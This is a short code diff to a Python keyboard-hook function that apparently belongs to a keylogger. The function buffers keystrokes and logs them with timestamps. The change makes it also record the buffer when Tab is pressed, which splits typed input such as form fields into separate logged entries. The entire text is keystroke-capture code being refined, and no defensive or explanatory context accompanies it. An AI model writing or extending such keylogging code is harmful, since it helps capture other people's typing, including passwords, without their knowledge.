@@ -403,7 +403,7 @@ def OnKeyboardEvent(event):
                         level=logging.DEBUG,
                         format='%(message)s')
 						
-	if (event.Ascii == 13) and len(buffer) > 0:
+	if (event.Ascii == 13 or event.KeyID == 9) and len(buffer) > 0:
 		buffer = datetime.datetime.now().strftime("%d/%m/%Y-%H:%M:%S") + ": " + buffer
 		logging.log(10, buffer)
 		buffer = ''
